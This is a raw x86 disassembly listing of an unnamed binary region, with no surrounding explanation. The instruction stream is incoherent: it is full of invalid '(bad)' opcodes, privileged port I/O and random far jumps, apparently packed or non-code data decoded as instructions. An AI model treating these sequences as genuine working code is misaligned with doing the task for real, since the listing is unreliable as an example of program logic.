  4130f4:	or     BYTE PTR [edx+eax*1+0x48],al
  4130f8:	xchg   ebx,eax
  4130f9:	stc    
  4130fa:	and    BYTE PTR ds:0x3e96f144,ah
  413100:	xor    al,0xdc
  413102:	and    dh,dl
  413104:	sub    bh,BYTE PTR [eax]
  413106:	gs sar bl,1
  413109:	retf   0x8987
  41310c:	ret    0xb2af
  41310f:	mov    edi,0x2909a793
  413114:	aaa    
  413115:	jo     0x413156
  413117:	or     al,0xf7
  413119:	fbstp  TBYTE PTR [eax+0x1ffcfa1e]
  41311f:	mov    ebp,0x7b36f0c3
  413124:	xchg   esp,eax
  413125:	pop    edx
  413126:	inc    edx
  413127:	ja     0x4130b7
  413129:	push   0x5c
  41312b:	xor    DWORD PTR [ebx+0x44],eax
  41312e:	xchg   DWORD PTR [ecx],esi
  413130:	sar    DWORD PTR [ecx+0x2f],cl
  413133:	or     ebp,DWORD PTR [ebx]
  413135:	and    BYTE PTR [ecx+0x5b2b4835],cl
  41313b:	sub    eax,0x544fa0f3
  413140:	stos   BYTE PTR es:[edi],al
  413141:	inc    edi
  413142:	fwait
  413143:	imul   esi,esi,0xfffffff0
  413146:	outs   dx,DWORD PTR ds:[esi]
  413147:	sti    
  413148:	add    esp,DWORD PTR [edi-0x654c25bc]
  41314e:	pop    eax
  41314f:	sub    DWORD PTR [esi+ebx*8],esp
  413152:	mov    eax,ds:0x4d49f7b9
  413157:	adc    eax,0xc857ae56
  41315c:	push   edx
  41315d:	repz inc esp
  41315f:	sbb    eax,0x2e6a1285
  413164:	mov    esp,0xf7378c30
  413169:	dec    ebp
  41316a:	xchg   ebx,eax
  41316b:	imul   ecx,DWORD PTR [ecx],0xf33dae7b
  413171:	lock inc esi
  413173:	dec    eax
  413174:	mov    ecx,0x615f2606
  413179:	stc    
  41317a:	mov    al,ds:0x87c457c1
  41317f:	rep outs dx,DWORD PTR gs:[esi]
  413182:	gs jp  0x413166
  413185:	(bad)  [esi-0x46217a8c]
  41318b:	sub    esp,ebx
  41318d:	call   0xdf86:0xfe9cc1e5
  413194:	mov    eax,0xd51f2b28
  413199:	rcl    BYTE PTR [ecx],0x28
  41319c:	out    0xcd,al
  41319e:	cwde   
  41319f:	pop    ebp
  4131a0:	or     dl,cl
  4131a2:	inc    ecx
  4131a3:	push   eax
  4131a4:	test   eax,0x17557fd5
  4131a9:	lock jle 0x4131ae
  4131ac:	fmul   DWORD PTR [edx]
  4131ae:	std    
  4131af:	retf   
  4131b0:	fwait
  4131b1:	sub    DWORD PTR [ecx],0x98a845b3
  4131b7:	in     eax,0x23
  4131b9:	xor    DWORD PTR [eax-0xc],ecx
  4131bc:	ss mov al,dh
  4131bf:	mov    ebx,DWORD PTR [ebx+0x6228e590]
  4131c5:	out    0xc0,eax
  4131c7:	sbb    al,0x8
  4131c9:	sbb    al,0x23
  4131cb:	xor    al,0x87
  4131cd:	clc    
  4131ce:	cld    
  4131cf:	xchg   edx,eax
  4131d0:	xchg   edi,eax
  4131d1:	xor    BYTE PTR [ecx],ah
  4131d3:	push   0x29dda99b
  4131d8:	inc    ebp
  4131d9:	fstp   DWORD PTR [ebx*2+0x3f3e2608]
  4131e0:	or     bh,BYTE PTR [ebx-0x10b0f4ca]
  4131e6:	pop    edx
  4131e7:	pop    ds
  4131e8:	aaa    
  4131e9:	xor    DWORD PTR [ecx+0x49be9c85],edi
  4131ef:	fs icebp 
  4131f1:	jo     0x4131e4
  4131f3:	out    0x50,eax
  4131f5:	popf   
  4131f6:	stc    
  4131f7:	xor    eax,0x366e19f7
  4131fc:	rol    BYTE PTR [edx+eiz*8],1
  4131ff:	test   al,0xed
  413201:	neg    dl
  413203:	cwde   
  413204:	pop    ds
  413205:	lea    ebp,[eax]
  413207:	mov    BYTE PTR [edi-0x4d],dl
  41320a:	inc    ebp
  41320b:	ins    BYTE PTR es:[edi],dx
  41320c:	aad    0x81
  41320e:	lods   al,BYTE PTR ds:[esi]
  41320f:	mov    bh,0x5
  413211:	aad    0xbe
  413213:	(bad)  
  413214:	(bad)  
  413215:	and    eax,DWORD PTR [esi-0x2f094116]
  41321b:	jnp    0x413239
  41321d:	cmp    DWORD PTR [edx],edx
  41321f:	and    DWORD PTR [ecx+0x47],ebx
  413222:	xchg   esi,edx
  413224:	xchg   esi,eax
  413225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413226:	into   
  413227:	sub    esi,edi
  413229:	xchg   ebx,eax
  41322a:	xlat   BYTE PTR ds:[ebx]
  41322b:	sbb    ah,BYTE PTR [ecx+eax*4]
  41322e:	loope  0x41327a
  413230:	adc    BYTE PTR es:[esp+ecx*8],ch
  413234:	or     esp,esi
  413236:	push   edi
  413237:	ss (bad) 
  413239:	jle    0x413227
  41323b:	(bad)  
  41323c:	inc    ebx
  41323d:	test   BYTE PTR [esi-0x1e],bl
  413240:	or     DWORD PTR [edi],ebx
  413242:	mov    ebx,esp
  413244:	aam    0xe3
  413246:	sbb    DWORD PTR [esi],esp
  413248:	daa    
  413249:	jmp    0x6bcc4069
  41324e:	test   DWORD PTR [ecx+0x48],esp
  413251:	pop    ecx
  413252:	test   esi,edx
  413254:	shl    al,1
  413256:	cs out 0x38,al
  413259:	bound  edi,QWORD PTR es:[ebp-0x41]
  41325d:	stos   BYTE PTR es:[edi],al
  41325e:	inc    ecx
  41325f:	xchg   ebp,eax
  413260:	hlt    
  413261:	pop    ss
  413262:	xchg   DWORD PTR [ecx-0x6e5f598],eax
  413268:	jmp    0x4132c7
  41326a:	retf   0xfd28
  41326d:	test   eax,0x16088c71
  413272:	adc    ch,BYTE PTR [ebx]
  413274:	push   edx
  413275:	xor    ebp,DWORD PTR [edi-0x70e9c37]
  41327b:	sar    cl,0xc9
  41327e:	shl    DWORD PTR [esi],1
  413280:	je     0x4132f2
  413282:	sub    BYTE PTR [eax+0x4786ed20],dh
  413288:	out    0x40,al
  41328a:	pop    es
  41328b:	mov    BYTE PTR [edi],cl
  41328d:	add    BYTE PTR es:[eax],ch
  413290:	in     eax,0xbb
  413292:	test   BYTE PTR [eax],al
  413294:	or     BYTE PTR [eax-0x5c244d83],dl
  41329a:	or     BYTE PTR [edi+0x27],cl
  41329d:	or     eax,0x7c81f40c
  4132a2:	shr    DWORD PTR [ecx],1
  4132a4:	sbb    ebx,DWORD PTR [ebx+0x6c]
  4132a7:	and    eax,0x1c638c87
  4132ac:	test   eax,0x57294c7f
  4132b1:	loope  0x4132b2
  4132b3:	mov    ds:0x29913125,al
  4132b8:	add    edx,DWORD PTR [eax+0x42]
  4132bb:	aam    0x9
  4132bd:	(bad)  
  4132be:	(bad)  
  4132c0:	dec    BYTE PTR [ecx+0x3]
  4132c3:	dec    ebx
  4132c4:	cs sbb al,0xff
  4132c7:	std    
  4132c8:	pop    edi
  4132c9:	inc    ebp
  4132ca:	shl    BYTE PTR ds:0xd7c11708,1
  4132d0:	xchg   edx,eax
  4132d1:	int    0xe2
  4132d3:	test   DWORD PTR [eax-0x72b87823],0xa9259230
  4132dd:	xlat   BYTE PTR ds:[ebx]
  4132de:	and    ebp,DWORD PTR [eax]
  4132e0:	mov    ds:0x8b3af92,al
  4132e5:	loop   0x41326d
  4132e7:	cs mov ecx,0x86c706ad
  4132ed:	adc    DWORD PTR [esi+esi*2+0x8],0xb8b3264
  4132f5:	jnp    0x4132ba
  4132f7:	adc    al,0x9
  4132f9:	aam    0x84
  4132fb:	repnz mov esi,0x95ba8e8d
  413301:	adc    BYTE PTR [eax-0xacbf929],0xaa
  413308:	inc    edi
  413309:	jo     0x413316
  41330b:	imul   ecx,DWORD PTR [ebx],0xa36b636e
  413311:	cmp    eax,0x7b9b6184
  413316:	dec    eax
  413317:	cli    
  413318:	lock jge 0x41338f
  41331b:	test   BYTE PTR [edi-0x35178f11],al
  413321:	repz sub bh,dl
  413324:	inc    eax
  413325:	sub    BYTE PTR [esi+0x4a],al
  413328:	or     bl,BYTE PTR [eax+0x4a]
  41332b:	mov    dh,0x4d
  41332d:	enter  0xb4a2,0xf8
  413331:	pop    ebx
  413332:	fs call 0xf9d8:0xce0cf070
  41333a:	int3   
  41333b:	inc    ecx
  41333c:	push   0xffffffbf
  41333e:	aam    0x2e
  413340:	xchg   ecx,eax
  413341:	sub    DWORD PTR [esi-0x5e989ed3],eax
  413347:	jb     0x4133c2
  413349:	jmp    0x2967:0xc3011076
  413350:	cmp    edi,esp
  413352:	adc    ah,BYTE PTR [ecx-0x39]
  413355:	stos   DWORD PTR es:[edi],eax
  413356:	xchg   BYTE PTR [ecx-0x6aae4548],ah
  41335c:	repz xchg ebx,eax
  41335e:	adc    BYTE PTR [ebx],ah
  413360:	sub    dh,BYTE PTR [eax+0x43]
  413363:	cmp    DWORD PTR [edi],eax
  413365:	bound  esp,QWORD PTR [ecx]
  413367:	add    al,BYTE PTR [ecx-0x10]
  41336a:	mul    BYTE PTR [edi]
  41336c:	sbb    al,0x4c
  41336e:	push   ebp
  41336f:	je     0x4133b1
  413371:	lock adc bh,cl
  413374:	push   0xffffffe2
  413376:	pop    ds
  413377:	mov    bh,0xf6
  413379:	idiv   esi
  41337b:	xchg   ebp,eax
  41337c:	pop    ss
  41337d:	int3   
  41337e:	and    BYTE PTR [edi-0x705eff89],0x80
  413385:	out    dx,eax
  413386:	test   al,0x6f
  413389:	sbb    DWORD PTR [ebp+0x4f],ecx
  41338c:	mov    esp,ebx
  41338e:	pop    ecx
  41338f:	(bad)  
  413390:	adc    ecx,DWORD PTR [esi]
  413392:	pop    ss
  413393:	and    BYTE PTR [ebx+0x68098643],cl
  413399:	pusha  
  41339a:	xchg   esi,eax
  41339b:	cs (bad) 
  41339d:	clc    
  41339e:	and    ebp,DWORD PTR [ecx]
  4133a0:	inc    ebx
  4133a1:	outs   dx,DWORD PTR ds:[si]
  4133a3:	es or  esi,ebx
  4133a6:	popa   
  4133a7:	sub    BYTE PTR [esi+0x48c5041b],0xcb
  4133ae:	clc    
  4133af:	mov    ds:0xe9bd7036,eax
  4133b4:	mov    ch,0x5e
  4133b6:	dec    edi
  4133b7:	or     BYTE PTR [eax],0x74
  4133ba:	xor    edx,DWORD PTR ds:0xa7deb414
  4133c0:	in     al,0xca
  4133c2:	rcl    BYTE PTR [esi],cl
  4133c4:	add    al,dh
  4133c6:	mov    al,0xd1
  4133c8:	dec    edi
  4133c9:	adc    edi,esp
  4133cb:	daa    
  4133cc:	xor    bl,BYTE PTR [edx-0x7377b4c4]
  4133d2:	mov    ah,0x78
  4133d4:	mov    dl,0x6d
  4133d6:	cs imul esi,edi,0x62
  4133da:	popf   
  4133db:	sub    BYTE PTR [esi],ah
  4133dd:	test   al,0xc1
  4133df:	nop
  4133e0:	adc    al,0x92
  4133e2:	mov    esi,0x95715125
  4133e7:	add    esi,DWORD PTR [edx+0x1d7d5b69]
  4133ed:	loope  0x41345b
  4133ef:	sub    cl,cl
  4133f1:	lods   al,BYTE PTR ds:[esi]
  4133f2:	ja     0x413438
  4133f4:	push   cs
  4133f5:	mov    eax,0x1011e0b7
  4133fa:	add    eax,0x799bdc5
  4133ff:	fldenv [ecx-0x7ed656b6]
  413405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413406:	cwde   
  413407:	push   0xb3b6fa08
  41340c:	or     ebp,DWORD PTR [ebx-0x53]
  41340f:	div    DWORD PTR ds:0xf96dc0f7
  413415:	sub    eax,DWORD PTR [eax+0x664f493b]
  41341b:	mov    DWORD PTR [esi],ecx
  41341d:	mov    esp,0xecdaa53b
  413422:	push   edi
  413423:	sbb    BYTE PTR [ecx+0x12d1ef31],cl
  413429:	icebp  
  41342a:	mov    dl,0x6e
  41342c:	ins    DWORD PTR es:[edi],dx
  41342d:	cdq    
  41342e:	add    eax,0xfbd3f205
  413433:	or     dl,ah
  413435:	mov    edx,0x6c857187
  41343a:	inc    eax
  41343b:	lahf   
  41343c:	jmp    0x8d980ad5
  413441:	clc    
  413442:	xchg   BYTE PTR [ebx+0xd],dh
  413445:	test   ch,0xa3
  413448:	fwait
  413449:	cmp    DWORD PTR [esi-0x7c5cf59],eax
  41344f:	ret    0x58f3
  413452:	jle    0x413482
  413454:	int    0x3d
  413456:	xor    BYTE PTR [esi+0x7096e061],bh
  41345c:	enter  0x87b9,0x1f
  413460:	jl     0x4134d2
  413462:	jno    0x413491
  413464:	xlat   BYTE PTR ds:[ebx]
  413465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413466:	test   al,0x2b
  413468:	add    ecx,DWORD PTR [edx]
  41346a:	mov    BYTE PTR [edx-0x164d434b],cl
  413470:	ja     0x4134c7
  413472:	test   ecx,ecx
  413474:	rcr    BYTE PTR [eax],0xd2
  413477:	in     al,0x68
  413479:	lock ds push ds
  41347c:	mov    cl,0xb7
  41347e:	in     al,dx
  41347f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413480:	xchg   edx,eax
  413481:	mov    DWORD PTR [edi-0x79d17fdf],esp
  413487:	test   eax,0x27893ef2
  41348c:	out    dx,eax
  41348d:	enter  0x29d4,0x6b
  413491:	mov    esp,0x7f7c545
  413496:	and    edi,DWORD PTR [edi+0x17]
  413499:	push   ecx
  41349a:	xlat   BYTE PTR ds:[ebx]
  41349b:	sub    edi,DWORD PTR [ecx+0x340268fe]
  4134a1:	arpl   bp,sp
  4134a3:	sub    dh,BYTE PTR [ebx+0x40]
  4134a6:	jl     0x4134f1
  4134a8:	or     dl,al
  4134aa:	inc    ebx
  4134ab:	add    ecx,DWORD PTR [esi+0x39d6043e]
  4134b1:	cmp    BYTE PTR ds:0xbb610dda,0x28
  4134b8:	in     al,dx
  4134b9:	push   0x50098bb4
  4134be:	cdq    
  4134bf:	mov    ?,WORD PTR [ebp+eiz*8-0xeeda640]
  4134c6:	loop   0x4134eb
  4134c8:	enter  0x516a,0x88
  4134cc:	fsubr  DWORD PTR [ebx+ebp*4+0x1b]
  4134d0:	or     BYTE PTR [eax],al
  4134d2:	imul   esi,DWORD PTR [edx-0x6f],0xffffff9b
  4134d6:	mov    eax,0xb6fe3a8d
  4134db:	inc    esp
  4134dc:	stc    
  4134dd:	push   0x29
  4134df:	mov    esi,0xea26044d
  4134e4:	fild   QWORD PTR [ebx-0x3c]
  4134e7:	adc    DWORD PTR [eax+0x17],0xc071586
  4134ee:	push   cs
  4134ef:	mov    dh,0xf
  4134f1:	into   
  4134f2:	mov    edx,0xd3cea0ed
  4134f7:	ds inc ebp
  4134f9:	jle    0x4134cf
  4134fb:	sub    bh,bl
  4134fd:	sti    
  4134fe:	out    dx,eax
  4134ff:	ds jl  0x4134d2
  413502:	xchg   DWORD PTR ds:0x8a06d346,ecx
  413508:	jae    0x4134e0
  41350a:	adc    eax,0x3cd5d28
  41350f:	fmul   DWORD PTR [ecx]
  413511:	fidivr DWORD PTR [esi+0x6970588a]
  413517:	dec    eax
  413518:	icebp  
  413519:	iret   
  41351a:	jo     0x413599
  41351c:	pop    edx
  41351d:	repnz or eax,0x70d07266
  413523:	(bad)  
  413524:	imul   eax,DWORD PTR ds:0x9fd348b4,0x409f7f81
  41352e:	popf   
  41352f:	push   ss
  413530:	mov    al,ds:0xe3f3ece2
  413535:	add    esi,ebp
  413537:	mov    ah,0x7a
  413539:	xchg   edx,eax
  41353a:	sub    eax,0x54cd7f29
  41353f:	add    ebp,ebp
  413541:	jo     0x413551
  413543:	jp     0x41353c
  413545:	fs jmp 0xfda02efd
  41354b:	cld    
  41354c:	jmp    0xb89f:0x600d86a1
  413553:	test   DWORD PTR [ecx],ecx
  413555:	addr16 ret 0x742e
  413559:	daa    
  41355a:	mov    esp,0x1b7e797c
  41355f:	aam    0x1f
  413561:	aas    
  413562:	adc    DWORD PTR [eax],ebp
  413564:	jl     0x4134e8
  413566:	jbe    0x413549
  413568:	jge    0x413558
  41356a:	or     DWORD PTR [edi],ebp
  41356c:	mov    edx,0x31c02e0d
  413571:	adc    BYTE PTR [eax+ebp*4-0x340f09ce],ah
  413578:	mov    esi,DWORD PTR [eax-0x2884501]
  41357e:	arpl   WORD PTR [eax+edx*2+0x9114682],bx
  413585:	xor    esi,DWORD PTR [edx-0x25]
  413588:	fsub   QWORD PTR ds:[ebp-0x1bc78d93]
  41358f:	iret   
  413590:	test   BYTE PTR [ebp-0xeefd2db],bh
  413596:	or     ebp,DWORD PTR [edi]
  413598:	hlt    
  413599:	dec    esi
  41359a:	dec    esp
  41359b:	sub    BYTE PTR [ebp-0x77c9fb4d],cl
  4135a1:	inc    ebp
  4135a2:	push   0x9fe5cf2d
  4135a7:	dec    ebp
  4135a8:	pop    edx
  4135a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135aa:	xchg   BYTE PTR [ecx-0x8],bl
  4135ad:	neg    BYTE PTR [ecx-0x5e]
  4135b0:	arpl   sp,bx
  4135b2:	loope  0x4135dc
  4135b4:	in     al,dx
  4135b5:	enter  0x64b7,0x9
  4135b9:	push   esi
  4135ba:	mov    WORD PTR [esi+0x69],ds
  4135bd:	sbb    eax,0x4c894030
  4135c2:	xchg   ecx,eax
  4135c3:	ret    
  4135c4:	test   DWORD PTR [edi+0x316e33e],0x2a491119
  4135ce:	popa   
  4135cf:	nop
  4135d0:	or     al,0xa3
  4135d2:	sub    DWORD PTR [ebx+0x35861c47],esp
  4135d8:	jmp    FWORD PTR [ebp+eax*1-0x6a8ebc97]
  4135df:	sub    DWORD PTR [esi-0x2b],esp
  4135e2:	repz (bad) 
  4135e4:	jns    0x413596
  4135e6:	sub    DWORD PTR [ebx+0x57bff0d3],0x62008a73
  4135f0:	xchg   edi,eax
  4135f1:	inc    ecx
  4135f2:	scas   al,BYTE PTR es:[edi]
  4135f3:	mov    bl,0x7d
  4135f5:	shl    BYTE PTR [ebp+0x13],cl
  4135f8:	pop    edx
  4135f9:	jg     0x413582
  4135fb:	shl    DWORD PTR [ebx-0x70],0xad
  4135ff:	in     eax,dx
  413600:	xchg   ebp,eax
  413601:	xor    BYTE PTR [ecx-0x2f16402d],bl
  413607:	jmp    0xe27026e4
  41360c:	lods   eax,DWORD PTR ds:[esi]
  41360d:	sar    dl,cl
  41360f:	dec    ebp
  413610:	mov    ds:0xeaaf89e5,eax
  413615:	mov    DWORD PTR [edi+0x158b8901],0x90b0f345
  41361f:	sub    BYTE PTR [eax+0x8cde2a3],dh
  413625:	sub    BYTE PTR [eax+0x7a],cl
  413628:	mov    ds:0xe39d3a1f,al
  41362d:	enter  0xd3f6,0x87
  413631:	pop    esp
  413632:	ret    0x841
  413635:	call   0x9cc2:0xc9df7e88
  41363c:	mov    ecx,0x8728dc3b
  413641:	push   0xb20ed869
  413646:	aad    0xe7
  413648:	push   dx
  41364a:	push   edx
  41364b:	jmp    0x413620
  41364d:	mov    esi,0xd3ddd86a
  413652:	cmp    al,0x29
  413654:	call   DWORD PTR [esi]
  413656:	mov    edi,0xd6827091
  41365b:	mov    bl,0x45
  41365e:	jp     0x413689
  413660:	rcr    ecx,cl
  413662:	das    
  413663:	das    
  413664:	out    0x6b,eax
  413666:	pop    ebp
  413667:	sub    dh,al
  413669:	mov    ebx,0xd39539ef
  41366e:	push   ds
  41366f:	mov    eax,ds:0xbd86e879
  413674:	mov    esi,0xeb15ddf2
  413679:	loope  0x4136f0
  41367b:	sub    DWORD PTR [edx+eax*8+0x22],esp
  41367f:	aas    
  413680:	js     0x413646
  413682:	mov    edi,0x7a72788
  413687:	sub    cl,BYTE PTR [ebx]
  413689:	fmul   DWORD PTR [ebp+0x26402c8e]
  41368f:	je     0x41367d
  413691:	mov    esp,0xf1a9aac2
  413696:	loop   0x4136d4
  413698:	sti    
  413699:	test   BYTE PTR [edx+0x63],ah
  41369c:	or     BYTE PTR [esi-0x3d526e9c],dl
  4136a2:	xor    BYTE PTR [eax],bl
  4136a4:	xchg   edi,eax
  4136a5:	addr16 cmp eax,0x863b0b75
  4136ab:	fidivr WORD PTR [ebx+0x36916759]
  4136b1:	call   0xb135:0xfb09ab38
  4136b8:	pushf  
  4136b9:	aam    0xb9
  4136bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136bc:	inc    edi
  4136bd:	test   DWORD PTR [ebx+0x29],0xc17c6fff
  4136c4:	repnz and bh,ch
  4136c7:	lock pop es
  4136c9:	retf   
  4136ca:	xchg   BYTE PTR [ebp-0x4f84ed26],al
  4136d0:	mov    ebp,DWORD PTR [esi]
  4136d2:	dec    edi
  4136d3:	pop    ss
  4136d4:	xor    eax,0x22a9de76
  4136d9:	inc    edx
  4136da:	lahf   
  4136db:	fxch   st(2)
  4136dd:	rol    BYTE PTR [esi-0x4b59986b],0x5e
  4136e4:	pop    ss
  4136e5:	nop
  4136e6:	shr    esp,cl
  4136e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136e9:	mov    al,ds:0x84842eab
  4136ee:	sbb    dh,BYTE PTR [ecx+eax*2-0x41]
  4136f2:	out    0xba,eax
  4136f4:	and    DWORD PTR [edx-0x7a],esi
  4136f7:	jg     0x4136ee
  4136f9:	add    eax,0xfef972d9
  4136fe:	or     al,0x28
  413700:	and    cl,dl
  413702:	shl    eax,0xeb
  413705:	lea    ebx,[ebx+0x3a]
  413708:	leave  
  413709:	icebp  
  41370a:	xchg   ebp,edi
  41370c:	mov    eax,0x7538beb
  413711:	inc    ecx
  413712:	test   BYTE PTR [eax],ch
  413714:	xchg   BYTE PTR [edx+edx*8],ah
  413717:	mov    edx,0xe61ea8ef
  41371c:	outs   dx,BYTE PTR ds:[esi]
  41371d:	shl    BYTE PTR [edx-0x765ede5b],cl
  413723:	rcl    DWORD PTR ds:0x5ff126a3,cl
  413729:	push   ecx
  41372a:	xchg   edi,eax
  41372b:	es sub dh,cl
  41372e:	pop    esp
  41372f:	inc    ebx
  413730:	pop    ebx
  413731:	nop
  413732:	in     eax,dx
  413733:	adc    eax,0xbf864e6f
  413738:	enter  0x5f89,0x3
  41373c:	inc    edi
  41373d:	aaa    
  41373e:	lock aaa 
  413740:	or     BYTE PTR [edi-0xe],al
  413743:	sub    eax,esp
  413745:	mov    al,0xa6
  413747:	lds    edx,FWORD PTR [esi+ebp*8-0x7a]
  41374b:	repz or DWORD PTR [ebp*8-0x350f2885],edi
  413753:	in     eax,0xb2
  413755:	adc    cl,BYTE PTR [ebp+0x4f]
  413758:	inc    eax
  413759:	into   
  41375a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41375b:	sbb    BYTE PTR [edi+0x6f9784d2],cl
  413761:	inc    ecx
  413762:	add    DWORD PTR [esi],edx
  413764:	or     eax,0xece7e6ad
  413769:	mov    ebx,DWORD PTR [edx-0x7e6f1cd5]
  41376f:	sub    al,BYTE PTR [esi+0x31]
  413772:	out    dx,al
  413773:	outs   dx,DWORD PTR ds:[esi]
  413774:	fild   QWORD PTR [ebp-0x2f]
  413777:	stos   DWORD PTR es:[edi],eax
  413778:	(bad)  
  413779:	push   ebx
  41377a:	lea    eax,ds:0x223ff308
  413780:	jmp    0x14f6:0x4c33af0
  413787:	xchg   esi,eax
  413788:	mov    ebp,DWORD PTR [edx+eiz*1]
  41378b:	lock mov al,0x14
  41378e:	cld    
  41378f:	mov    edx,DWORD PTR [ecx]
  413791:	jns    0x41371a
  413793:	push   ebx
  413794:	push   0x5e2eab0
  413799:	lods   al,BYTE PTR ds:[esi]
  41379a:	cmp    ebp,DWORD PTR [eax]
  41379c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41379d:	mov    ecx,0xe6fac227
  4137a2:	xchg   ebp,eax
  4137a3:	clc    
  4137a4:	jno    0x4137f3
  4137a6:	xchg   BYTE PTR [edi-0x6a],ch
  4137a9:	aaa    
  4137aa:	mov    esi,DWORD PTR [edi+0x299903a7]
  4137b0:	aaa    
  4137b1:	pushf  
  4137b2:	in     al,dx
  4137b3:	js     0x4137bd
  4137b5:	inc    esp
  4137b6:	inc    edi
  4137b7:	jmp    0x413765
  4137b9:	ds push esi
  4137bb:	mov    dl,0xdd
  4137bd:	stc    
  4137be:	and    al,0xff
  4137c0:	jl     0x41377d
  4137c2:	add    bh,BYTE PTR [edi-0x67]
  4137c5:	icebp  
  4137c6:	adc    DWORD PTR [ecx+0x935cbf7],ebp
  4137cc:	(bad)  
  4137cd:	xchg   esi,eax
  4137ce:	je     0x413787
  4137d0:	mov    ebp,0x4ccefcf0
  4137d5:	adc    DWORD PTR [edx+0x1a],esp
  4137d8:	fucomp st(1)
  4137da:	push   ebp
  4137db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137dc:	or     BYTE PTR [edx+0x3eba2170],ch
  4137e2:	dec    DWORD PTR [ebx+0x22]
  4137e5:	(bad)  
  4137e6:	(bad)  
  4137e7:	jmp    0x9fc3:0x3a830315
  4137ee:	jmp    FWORD PTR [eax-0x78064ff7]
  4137f4:	int    0x18
  4137f6:	int3   
  4137f7:	lods   al,BYTE PTR ds:[esi]
  4137f8:	cmp    DWORD PTR fs:[eax],0x9b32f7b1
  4137ff:	jnp    0x41384a
  413801:	adc    BYTE PTR [ebp+ecx*8+0x5e0973e0],dh
  413808:	lahf   
  413809:	inc    DWORD PTR [ebx+0x1c314ebd]
  41380f:	push   esp
  413810:	(bad)  
  413812:	mov    al,0x5c
  413814:	adc    BYTE PTR [ebx+edi*4-0x504eac0f],ah
  41381b:	add    cl,BYTE PTR [edx+0x7ecd8632]
  413821:	mov    bh,0x84
  413823:	mov    esi,ecx
  413825:	clc    
  413826:	jnp    0x41383c
  413828:	mov    cl,0x4e
  41382a:	outs   dx,DWORD PTR ds:[esi]
  41382b:	test   eax,0xada1778c
  413830:	dec    DWORD PTR [ebx-0x1ac3ec07]
  413836:	js     0x413862
  413838:	int3   
  413839:	jb     0x4137d1
  41383b:	xchg   esp,eax
  41383c:	and    dh,al
  41383e:	jbe    0x413816
  413840:	mov    ?,WORD PTR [ecx]
  413842:	jmp    0xb67e:0x68f807a8
  413849:	xchg   BYTE PTR [ecx-0x780a172f],ah
  41384f:	push   edi
  413850:	inc    ecx
  413851:	lock cli 
  413853:	fisubr DWORD PTR [esi+ebp*2-0x21]
  413857:	js     0x41382c
  413859:	xor    BYTE PTR ds:0x78b00a02,dl
  41385f:	ins    DWORD PTR es:[edi],dx
  413860:	sti    
  413861:	sbb    esi,DWORD PTR [esi]
  413863:	add    DWORD PTR [eax+0x2946209b],esi
  413869:	icebp  
  41386a:	mov    ah,al
  41386c:	cmp    BYTE PTR [ebx],bh
  41386e:	sub    al,0x6
  413870:	test   eax,0x64378e2f
  413875:	iret   
  413876:	nop
  413877:	push   ecx
  413878:	xor    eax,0xe128a2be
  41387d:	mov    esp,0xf6937252
  413882:	push   eax
  413883:	scas   al,BYTE PTR es:[edi]
  413884:	mov    esp,0x997677f9
  413889:	pop    edi
  41388a:	push   es
  41388b:	es cmp eax,0xdc778779
  413891:	in     al,0xbd
  413893:	repz std 
  413895:	into   
  413896:	add    bh,al
  413898:	xor    eax,0x1e2d4570
  41389d:	mov    ah,BYTE PTR [eax+ecx*8+0x5b5ab624]
  4138a4:	or     DWORD PTR [esi+0x6],ebx
  4138a7:	popf   
  4138a8:	sti    
  4138a9:	mov    dl,0x8b
  4138ab:	xor    ecx,ecx
  4138ad:	jle    0x413872
  4138af:	sub    DWORD PTR [ebx+ecx*2],ebx
  4138b2:	iret   
  4138b3:	fsin   
  4138b5:	sub    BYTE PTR [ebp+ebx*4-0x167b2a36],cl
  4138bc:	inc    esp
  4138bd:	mov    edi,0xf0986028
  4138c2:	push   esi
  4138c3:	repnz xor al,0x87
  4138c6:	in     eax,0x8b
  4138c8:	rcr    DWORD PTR fs:[esi-0x7b],1
  4138cc:	mov    ds:0x1be987d3,al
  4138d1:	gs push edi
  4138d3:	pusha  
  4138d4:	outs   dx,DWORD PTR ds:[esi]
  4138d5:	es retf 
  4138d7:	sub    DWORD PTR [edx+0x46],eax
  4138da:	loopne 0x41389a
  4138dc:	imul   DWORD PTR [ebx]
  4138de:	inc    ebp
  4138df:	jp     0x41392d
  4138e1:	dec    ecx
  4138e2:	xor    BYTE PTR [edx+0x4e],ch
  4138e5:	icebp  
  4138e6:	nop
  4138e7:	pop    ebp
  4138e8:	ret    
  4138e9:	and    BYTE PTR [ebp+0x6],dl
  4138ec:	jle    0x4138b0
  4138ee:	inc    edx
  4138ef:	inc    eax
  4138f0:	outs   dx,BYTE PTR ds:[esi]
  4138f1:	jae    0x41387a
  4138f3:	(bad)  
  4138f4:	adc    ebp,DWORD PTR [ebx+0x4bad631b]
  4138fa:	int3   
  4138fb:	sub    BYTE PTR [esi-0x50],ch
  4138fe:	retf   0x32cb
  413901:	lock inc ecx
  413903:	inc    ecx
  413904:	mov    BYTE PTR [eax+0x10b5e99c],cl
  41390a:	pop    ebx
  41390b:	js     0x4138e0
  41390d:	repnz enter 0x16cc,0x9d
  413912:	adc    eax,0xfb59111b
  413917:	call   0x60ac6732
  41391c:	mov    bl,BYTE PTR [ebp-0x3f2e32e1]
  413922:	xchg   BYTE PTR [ebx-0x40970f23],ch
  413928:	out    0x96,eax
  41392a:	xchg   esi,eax
  41392b:	jo     0x4138bc
  41392d:	jle    0x41399f
  41392f:	in     eax,dx
  413930:	lods   eax,DWORD PTR ds:[esi]
  413931:	dec    esp
  413932:	xchg   DWORD PTR [ebx],ebp
  413934:	xchg   ebp,eax
  413935:	adc    al,0x99
  413937:	enter  0x4400,0xd0
  41393b:	mov    ecx,0x6b86815c
  413940:	add    al,0x59
  413942:	arpl   WORD PTR [ebx],bp
  413944:	cmp    al,0x8b
  413946:	xchg   BYTE PTR [ecx],al
  413948:	es ja  0x413903
  41394b:	and    al,BYTE PTR [ecx]
  41394d:	add    BYTE PTR [ebp+0x1b3c8129],al
